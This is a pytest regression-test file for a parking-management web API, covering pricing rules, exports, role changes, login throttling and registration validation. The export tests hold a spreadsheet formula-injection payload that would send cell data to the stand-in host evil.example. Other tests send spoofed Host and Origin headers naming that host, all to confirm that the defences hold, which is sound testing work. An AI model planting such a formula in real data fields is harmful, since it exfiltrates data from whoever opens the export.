"""Regression tests for bugs found in the project review (v1.1).

Each test names the failure it guards against; the first group was verified
to FAIL against the v1.0 code before the fixes were made.
"""
import csv
import io
import zipfile

import pytest
from openpyxl import load_workbook

from conftest import check_in, clear_pending, free_space_id, pending, register


# ---------------------------------------------------------------- pricing --
def test_editing_rule_type_while_car_is_parked_does_not_break_anything(admin, customer):
    """v1.0: switching a rule HOURLY->FLAT with a car parked under it made the
    dashboard, the session detail and the exit all return HTTP 500."""
    rules = admin.call("GET", "/api/admin/pricing-rules")[1]
    hourly = next(r for r in rules if r["type"] == "HOURLY")
    for s in admin.call("GET", "/api/admin/schedules")[1]:        # make the default rule the one used
        admin.call("PUT", f"/api/admin/schedules/{s['id']}", {**s, "active": False})
    sid, token = check_in(admin, customer, "Tipo Cambiado", "TYP001")

    new_cfg = {"name": hourly["name"], "type": "FLAT", "configuration": {"flat_rate": 9999},
               "is_default": True, "active": True}
    assert admin.call("PUT", f"/api/admin/pricing-rules/{hourly['id']}", new_cfg)[0] == 200

    assert admin.call("GET", "/api/admin/dashboard")[0] == 200
    assert admin.call("GET", f"/api/admin/sessions/{sid}")[0] == 200
    status, view, _ = customer.call("GET", f"/api/customer/session/{token}")
    assert status == 200
    assert view["estimated_amount"] == 5000, "keeps the HOURLY price it was registered with"
    status, done, _ = admin.call("POST", f"/api/admin/sessions/{sid}/exit")
    assert status == 200 and done["final_amount"] == 5000

    # restore for the other tests
    admin.call("PUT", f"/api/admin/pricing-rules/{hourly['id']}", {**new_cfg, "type": "HOURLY", "configuration": hourly["configuration"]})
    for s in admin.call("GET", "/api/admin/schedules")[1]:
        admin.call("PUT", f"/api/admin/schedules/{s['id']}", {**s, "active": True})


def test_deleting_a_rule_that_was_used_is_a_clear_400_not_a_500(admin, customer):
    """v1.0: DELETE on a rule referenced by past sessions -> bare HTTP 500."""
    rule = admin.call("POST", "/api/admin/pricing-rules", {
        "name": "Temp rule", "type": "FLAT", "configuration": {"flat_rate": 1000},
        "is_default": False, "active": True})[1]
    sched = admin.call("POST", "/api/admin/schedules", {
        "name": "temp all-day", "days_of_week": "ALL", "start_time": "00:00", "end_time": "00:00",
        "pricing_rule_id": rule["id"], "priority": 1, "active": True})[1]
    sid, _ = check_in(admin, customer, "Usa Regla", "DEL001")
    admin.call("POST", f"/api/admin/sessions/{sid}/exit")
    admin.call("DELETE", f"/api/admin/schedules/{sched['id']}")

    status, body, _ = admin.call("DELETE", f"/api/admin/pricing-rules/{rule['id']}")
    assert status == 400 and "Deactivate" in body["detail"]
    # ...while a rule nobody used can still be deleted
    unused = admin.call("POST", "/api/admin/pricing-rules", {
        "name": "Never used", "type": "FLAT", "configuration": {"flat_rate": 1}, "is_default": False, "active": True})[1]
    assert admin.call("DELETE", f"/api/admin/pricing-rules/{unused['id']}")[0] == 200
    admin.call("PUT", f"/api/admin/pricing-rules/{rule['id']}", {**rule, "active": False})


def test_cannot_delete_the_last_active_rule(admin):
    rules = [r for r in admin.call("GET", "/api/admin/pricing-rules")[1] if r["active"]]
    fresh = admin.call("POST", "/api/admin/pricing-rules", {
        "name": "Only one", "type": "FLAT", "configuration": {"flat_rate": 1}, "is_default": False, "active": True})[1]
    others = [r for r in rules]
    for r in others:
        admin.call("PUT", f"/api/admin/pricing-rules/{r['id']}", {**r, "active": False})
    try:
        status, body, _ = admin.call("DELETE", f"/api/admin/pricing-rules/{fresh['id']}")
        assert status == 400 and "At least one active" in body["detail"]
    finally:
        for r in others:
            admin.call("PUT", f"/api/admin/pricing-rules/{r['id']}", {**r, "active": True})
        admin.call("DELETE", f"/api/admin/pricing-rules/{fresh['id']}")


# ---------------------------------------------------------------- exports --
EVIL = '=HYPERLINK("http://evil.example/?"&A1,"click")'


def test_exports_do_not_turn_customer_input_into_formulas(admin, customer):
    """v1.0: a registration named '=...' became a live formula in the XLSX
    (and in the CSV when opened with Excel)."""
    sid, _ = check_in(admin, customer, EVIL, "FRM001")
    admin.call("POST", f"/api/admin/sessions/{sid}/exit")

    status, body, headers = admin.call("GET", "/api/admin/export/xlsx?plate=FRM001", raw=True)
    assert status == 200
    xml = zipfile.ZipFile(io.BytesIO(body)).read("xl/worksheets/sheet1.xml").decode()
    assert "<f>" not in xml, "no formula element may be written"
    cell = load_workbook(io.BytesIO(body)).active.cell(row=2, column=2)
    assert cell.value == EVIL and cell.data_type == "s"

    status, body, _ = admin.call("GET", "/api/admin/export/csv?plate=FRM001", raw=True)
    rows = list(csv.reader(io.StringIO(body.decode("utf-8-sig"))))
    assert rows[1][1] == "'" + EVIL, "CSV cell is prefixed so spreadsheets read it as text"


def test_exports_keep_normal_phone_numbers_untouched_and_respect_filters(admin, customer):
    status, _, _ = register(customer, "Con Telefono", "PHN001", "+57 300 123 4567")
    assert status == 200
    clear_pending(admin)
    body = admin.call("GET", "/api/admin/export/csv?plate=PHN001", raw=True)[1].decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(body)))
    assert len(rows) == 2, "filter applied: header + the one matching row"
    assert rows[1][3] == "+57 300 123 4567"


# ------------------------------------------------------------------ roles --
def test_demoting_an_admin_ends_their_open_session(admin, server):
    """v1.0: the role was frozen into the login token, so a demoted admin kept
    full admin rights for up to 12 hours."""
    assert admin.call("POST", "/api/admin/users", {"username": "jefe2", "display_name": "Jefe 2",
                                                    "pin": "4321", "role": "ADMIN"})[0] == 200
    other = server.client()
    assert other.login("jefe2", "4321")[0] == 200
    assert other.call("GET", "/api/admin/users")[0] == 200

    uid = next(u["id"] for u in admin.call("GET", "/api/admin/users")[1] if u["username"] == "jefe2")
    assert admin.call("PUT", f"/api/admin/users/{uid}", {"role": "ATTENDANT"})[0] == 200

    assert other.call("GET", "/api/admin/users")[0] == 401, "old token is dead"
    fresh = server.client()
    assert fresh.login("jefe2", "4321")[0] == 200
    assert fresh.call("GET", "/api/admin/users")[0] == 403, "new login only has attendant rights"


def test_login_is_throttled_after_repeated_failures(server):
    admin = server.client()
    admin.login()
    admin.call("POST", "/api/admin/users", {"username": "lento", "display_name": "Lento", "pin": "7777", "role": "ATTENDANT"})
    c = server.client()
    codes = [c.login("lento", f"000{i}")[0] for i in range(5)]
    assert codes == [401] * 5
    status, body = c.login("lento", "7777")           # correct PIN, but locked out
    assert status == 429 and "Try again in" in body["detail"]
    assert server.client().login("admin", "1234")[0] == 200, "other accounts are unaffected"


# --------------------------------------------------- network-layer hardening --
def test_admin_requests_with_a_foreign_host_header_are_refused(server):
    """DNS-rebinding defence: same machine, but the request names another host."""
    c = server.client()
    status, _, _ = c.call("POST", "/api/admin/login", {"username": "admin", "pin": "1234"},
                          headers={"Host": "evil.example"})
    assert status == 403


def test_no_cors_headers_and_no_public_api_docs(server):
    c = server.client()
    status, _, headers = c.call("OPTIONS", "/api/admin/login", headers={
        "Origin": "https://evil.example", "Access-Control-Request-Method": "POST"})
    assert not any(k.lower().startswith("access-control-allow") for k in headers)
    assert c.call("GET", "/docs", raw=True)[0] == 404
    assert c.call("GET", "/openapi.json", raw=True)[0] == 404


# ------------------------------------------------------ customer registration --
@pytest.mark.parametrize("name,plate,phone", [
    ("Ok Name", "<b>", None), ("Ok Name", "A", None), ("Ok Name", "ABC 123 456 789 0", None),
    ("X", "ABC123", None), ("Ok Name", "ABC123", "not a phone"),
])
def test_registration_rejects_malformed_input(customer, name, plate, phone):
    status, body, _ = register(customer, name, plate, phone)
    assert status == 422 and isinstance(body["detail"], list)


def test_registration_accepts_common_formats(admin, customer):
    for plate, phone in (("ABC123", "300 000 0000"), ("xyz 98d", "+57 (300) 111-2222"), ("AB-1234", None)):
        status, body, _ = register(customer, "María Pérez", plate, phone)
        assert status == 200, (plate, body)
        clear_pending(admin)


def test_registration_is_rate_limited_per_device(admin, customer):
    codes = [register(customer, "Spammer", f"SPM{i:03d}")[0] for i in range(8)]
    assert codes[:6] == [200] * 6 and set(codes[6:]) == {429}
    clear_pending(admin)


def test_pending_queue_is_capped(admin, server):
    created = 0
    for i in range(45):
        c = server.client()
        status, _, _ = c.call("POST", "/api/customer/register", {"name": "Fila Larga", "plate": f"QUE{i:03d}"},
                              headers={"CF-Connecting-IP": f"198.51.100.{i}"})
        created += status == 200
        if status == 429:
            break
    try:
        assert created == 40
    finally:
        clear_pending(admin)


def test_same_plate_with_a_different_name_does_not_rewrite_past_history(admin, customer):
    """v1.0: re-registering a plate under another name renamed the OLD sessions."""
    sid, _ = check_in(admin, customer, "Ana Gomez", "REN111")
    admin.call("POST", f"/api/admin/sessions/{sid}/exit")
    register(customer, "Beto Perez", "REN111")
    assert admin.call("GET", f"/api/admin/sessions/{sid}")[1]["customer_name"] == "Ana Gomez"
    clear_pending(admin)


# ------------------------------------------------------------------ history --
def test_history_date_range_pagination_and_bad_dates(admin, customer):
    from datetime import date
    for i in range(3):
        sid, _ = check_in(admin, customer, f"Hist {i}", f"HST00{i}")
        admin.call("POST", f"/api/admin/sessions/{sid}/exit")
    today = date.today().isoformat()

    inclusive = admin.call("GET", f"/api/admin/history?date_from={today}&date_to={today}&plate=HST")[1]
    assert inclusive["total"] == 3, "a one-day custom range must include that whole day"

    page = admin.call("GET", "/api/admin/history?plate=HST&limit=2&offset=0")[1]
    nxt = admin.call("GET", "/api/admin/history?plate=HST&limit=2&offset=2")[1]
    assert (page["total"], len(page["results"]), len(nxt["results"])) == (3, 2, 1)

    status, body, _ = admin.call("GET", "/api/admin/history?date_from=garbage")
    assert status == 400 and "Invalid date" in body["detail"]


def test_attendant_still_cannot_reach_admin_only_routes(server, admin):
    admin.call("POST", "/api/admin/users", {"username": "vigi", "display_name": "Vigilante", "pin": "5555", "role": "ATTENDANT"})
    v = server.client()
    assert v.login("vigi", "5555")[0] == 200
    for path in ("/api/admin/pricing-rules", "/api/admin/revenue", "/api/admin/history", "/api/admin/users",
                 "/api/admin/export/csv", "/api/admin/settings"):
        assert v.call("GET", path)[0] == 403, path
    assert v.call("GET", "/api/admin/dashboard")[0] == 200
